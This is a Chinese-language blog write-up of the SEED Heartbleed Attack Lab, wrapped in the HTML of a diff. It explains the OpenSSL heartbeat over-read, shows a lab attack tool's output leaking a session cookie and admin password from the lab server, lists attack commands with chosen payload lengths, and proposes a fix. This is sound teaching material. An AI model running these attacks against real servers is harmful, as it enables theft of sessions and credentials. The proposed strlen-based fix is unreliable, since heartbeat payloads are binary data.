@@ -1,0 +1,863 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="实验准备设置两个 VM:   攻击者机器 修改&#x2F;etc&#x2F;hosts 文件将服务器名映射到服务器 VM 的 IP 地址，在&#x2F;etc&#x2F;hosts 中搜索127.0.0.1   www.heartbleedlabelgg.com，将承载ELGG应用程序的服务器VM的实际IP地址替换掉127.0.0.1   受害者服务器  Heartbleed漏洞分析OpenSSL 库中的一个漏洞，受影响的 OpenSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SEED-lab：Heartbleed Attack Lab">
+<meta property="og:url" content="http://gls.show/p/cd441a20/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="实验准备设置两个 VM:   攻击者机器 修改&#x2F;etc&#x2F;hosts 文件将服务器名映射到服务器 VM 的 IP 地址，在&#x2F;etc&#x2F;hosts 中搜索127.0.0.1   www.heartbleedlabelgg.com，将承载ELGG应用程序的服务器VM的实际IP地址替换掉127.0.0.1   受害者服务器  Heartbleed漏洞分析OpenSSL 库中的一个漏洞，受影响的 OpenSS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/heartbleed-bug.png">
+<meta property="article:published_time" content="2022-11-26T14:44:53.461Z">
+<meta property="article:modified_time" content="2023-03-26T14:29:02.962Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/heartbleed-bug.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SEED-lab：Heartbleed Attack Lab - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SEED-lab：Heartbleed Attack Lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-26 22:44" pubdate>
+          2022年11月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SEED-lab：Heartbleed Attack Lab</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年3月26日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h1><p>设置两个 VM: </p>
+<ul>
+<li>攻击者机器<ul>
+<li>修改/etc/hosts 文件将服务器名映射到服务器 VM 的 IP 地址，在/etc/hosts 中搜索<code>127.0.0.1   www.heartbleedlabelgg.com</code>，将承载ELGG应用程序的服务器VM的实际IP地址替换掉127.0.0.1</li>
+</ul>
+</li>
+<li>受害者服务器</li>
+</ul>
+<h1 id="Heartbleed漏洞分析"><a href="#Heartbleed漏洞分析" class="headerlink" title="Heartbleed漏洞分析"></a>Heartbleed漏洞分析</h1><p>OpenSSL 库中的一个漏洞，受影响的 OpenSSL 版本范围从1.0.1到1.0.1 f，在一些新版本的OpenSSL中无法复现</p>
+<p>心跳协议是如何工作的。心跳协议由两种消息类型组成: HeartbeatRequest 包和 HeartbeatResponse 包。客户端向服务器发送一个 HeartbeatRequest 数据包。当服务器接收到它时，它会发回 HeartbeatResponse 数据包中接收到的消息的副本。目标是保持连接活跃</p>
+<p>心脏出血攻击是基于心跳请求的。这个请求只是向服务器发送一些数据，服务器将把这些数据复制到它的响应数据包中，这样所有的数据都会得到回显</p>
+<p><strong>在正常情况下，假设请求包含3个字节的数据“ ABC”，因此长度字段的值为3。服务器将把数据放在内存中，并从数据的开头复制3个字节到它的响应数据包。在攻击场景中，请求可能包含3个字节的数据，但长度字段可能是1003。当服务器构造它的响应数据包时，它从数据的开始进行复制(即“ ABC”) ，但是它复制的是1003个字节，而不是3个字节。这额外的1000种类型显然不是来自请求数据包; 它们来自服务器的私有内存，并且它们可能包含其他用户的信息、密钥和密码</strong></p>
+<h1 id="Task-1-Launch-the-Heartbleed-Attack"><a href="#Task-1-Launch-the-Heartbleed-Attack" class="headerlink" title="Task 1: Launch the Heartbleed Attack"></a>Task 1: Launch the Heartbleed Attack</h1><p>攻击步骤：</p>
+<ul>
+<li><p>访问 <a target="_blank" rel="noopener" href="https://www.heartbleedlabelgg.com/">https://www.heartbleedlabelgg.com</a></p>
+</li>
+<li><p>以管理员身份登录：admin ：seedelgg</p>
+</li>
+<li><p>添加boby为friend，并给他发送私人信息</p>
+</li>
+</ul>
+<p>多次运行攻击的回显如下</p>
+<p>可以看出泄露了cookie、username、密码等关键信息</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs clean"># ./attack.py www.heartbleedlabelgg.com<br><br>defribulator v1<span class="hljs-number">.20</span><br>A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE<span class="hljs-number">-2014</span><span class="hljs-number">-0160</span>)<br><br>##################################################################<br>Connecting to: www.heartbleedlabelgg.com:<span class="hljs-number">443</span>, <span class="hljs-number">1</span> times<br>Sending Client Hello for TLSv1<span class="hljs-number">.0</span><br>Analyze the result....<br>Analyze the result....<br>Analyze the result....<br>Analyze the result....<br>Received Server Hello for TLSv1<span class="hljs-number">.0</span><br>Analyze the result....<br><br>WARNING: www.heartbleedlabelgg.com:<span class="hljs-number">443</span> returned more data than it should - server is vulnerable!<br>Please wait... connection attempt <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span><br>##################################################################<br><br>.@.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...<br>...!<span class="hljs-number">.9</span><span class="hljs-number">.8</span>........<span class="hljs-number">.5</span>...............<br>........<span class="hljs-number">.3</span><span class="hljs-number">.2</span>.....E.D...../...A.................................I.........<br>...........<br>...................................#.......-US,en;q=<span class="hljs-number">0.5</span><br>Accept-Encoding: gzip, deflate<br>Referer: https:<span class="hljs-comment">//www.heartbleedlabelgg.com/profile/boby</span><br>Cookie: Elgg=vt3bsst6tb3ov6njhj7kcijn42<br>Connection: keep-alive<br>If-None-Match: <span class="hljs-string">&quot;1449721729&quot;</span><br><br>..*.......a<span class="hljs-number">.3</span>v.O.akf.........b3ov6njhj7kcijn42<br>Connection: keep-alive<br><br>_..@?.<br>.<span class="hljs-number">.2</span>....&#123; d..................=<span class="hljs-number">1670072367</span>&amp;username=admin&amp;password=seedlggT.;<span class="hljs-number">.8</span>A.K..VY.<span class="hljs-string">&quot;....&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-2-Find-the-Cause-of-the-Heartbleed-Vulnerability"><a href="#Task-2-Find-the-Cause-of-the-Heartbleed-Vulnerability" class="headerlink" title="Task 2: Find the Cause of the Heartbleed Vulnerability"></a>Task 2: Find the Cause of the Heartbleed Vulnerability</h1><p>比较良性数据包和攻击者代码发送的恶意数据包的结果，以找出心脏出血漏洞的根本原因</p>
+<blockquote>
+<p>当 Heartbeat 请求数据包到来时，服务器将解析数据包以获得有效负载和有效负载长度值(如图1所示)。这里，有效负载只是一个3字节的字符串“ ABC”，有效负载长度值正好是3。服务器程序将盲目地从请求数据包中获取这个长度值。然后，它通过指向存储“ ABC”的内存并将负载长度字节复制到响应负载来构建响应数据包。这样，响应数据包将包含一个3字节的字符串“ ABC”。我们可以启动 HeartBleed 攻击，将有效负载长度字段设置为1003。在构建响应数据包时，服务器将再次盲目地采用这个 Payload 长度值。这一次，服务器程序将指向字符串“ ABC”，并将1003字节作为有效负载从内存复制到响应数据包。除了字符串“ ABC”之外，额外的1000字节被复制到响应数据包中，这些数据包可以是内存中的任何内容，比如机密活动、日志信息、密码等等</p>
+</blockquote>
+<p>图示：</p>
+<p><img src="https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Heartbleed%20Attack%20Lab/image/The%20Heartbleed%20Attack%20Communication.png" srcset="/img/loading.gif" lazyload></p>
+<p>​             </p>
+<p><img src="https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Heartbleed%20Attack%20Lab/image/The%20Benign%20Heartbeat%20Communication.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过命令行参数控制有效载荷长度值，该参数默认是0x4000</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$./attack<span class="hljs-selector-class">.py</span> www<span class="hljs-selector-class">.heartbleedlabelgg</span><span class="hljs-selector-class">.com</span> -l <span class="hljs-number">0</span>x015B<br>$./attack<span class="hljs-selector-class">.py</span> www<span class="hljs-selector-class">.heartbleedlabelgg</span><span class="hljs-selector-class">.com</span> --length <span class="hljs-number">83</span><br></code></pre></td></tr></table></figure>
+
+<p>Question 2.1: As the length variable decreases, what kind of difference can you observe?</p>
+<p>回返的信息长度减少</p>
+<p>Question 2.2: As the length variable decreases, there is a boundary value for the input length vari-<br>able. At or below that boundary, the Heartbeat query will receive a response packet without attaching<br>any extra data (which means the request is benign). Please find that boundary length. You may need<br>to try many different length values until the web server sends back the reply without extra data. To<br>help you with this, when the number of returned bytes is smaller than the expected length, the pro-<br>gram will print “Server processed malformed Heartbeat, but did not return<br>any extra data.”</p>
+<p>边界值：22</p>
+<p>回显形式1：</p>
+<blockquote>
+<p>WARNING: <a target="_blank" rel="noopener" href="http://www.heartbleedlabelgg.com:443/">www.heartbleedlabelgg.com:443</a> returned more data than it should - server is vulnerable!</p>
+</blockquote>
+<p>回显形式2：</p>
+<blockquote>
+<p>Server processed malformed heartbeat, but did not return any extra data.</p>
+</blockquote>
+<h1 id="Task-3-Countermeasure-and-Bug-Fix"><a href="#Task-3-Countermeasure-and-Bug-Fix" class="headerlink" title="Task 3: Countermeasure and Bug Fix"></a>Task 3: Countermeasure and Bug Fix</h1><p>使用<code>sudo apt-get update</code>将 OpenSSL 库更新到最新版本，发现之后的攻击无效</p>
+<p>Heartbeat request/response 包格式如下：</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    HeartbeatMessageType type; <span class="hljs-comment">// 1 byte: request or the response</span><br>    uint16 payload_length; <span class="hljs-comment">// 2 byte: the length of the payload</span><br>    opaque payload[HeartbeatMessage.payload_length];<br>    opaque padding[padding_length];<br>&#125; HeartbeatMessage;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>type是类型信息</p>
+</li>
+<li><p>payload_length是有效负载长度</p>
+</li>
+<li><p>payload是实际的有效负载</p>
+</li>
+<li><p>填充字段</p>
+</li>
+</ul>
+<blockquote>
+<p>有效负载的大小应该与有效负载长度字段中的值相同，但是在攻击场景中，有效负载长度可以设置为不同的值</p>
+</blockquote>
+<p>导致bug的语句是<code>memcpy(bp, pl, payload); </code>，其中，bp指向buffer，pl指向payload，它会将payload长度的内容从pl复制到bp（正如Alice所说），而这并没有做边界检查</p>
+<p>在memcpy之前加上以下语句以修订：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">payload = payload_length &gt; <span class="hljs-built_in">strlen</span>(pl) ? <span class="hljs-built_in">strlen</span>(pl) : payload_length ;<br></code></pre></td></tr></table></figure>
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SEED-lab/" class="category-chain-item">SEED-lab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SEED-lab：Heartbleed Attack Lab</div>
+      <div>http://gls.show/p/cd441a20/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月26日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/52c1e0f8/" title="MIT-6.S081：Lab1 Xv6 and Unix utilities">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">MIT-6.S081：Lab1 Xv6 and Unix utilities</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/187136b6/" title="SEED-lab：Buffer-Overflow Attack Lab （16.04虚拟机）">
+                        <span class="hidden-mobile">SEED-lab：Buffer-Overflow Attack Lab （16.04虚拟机）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
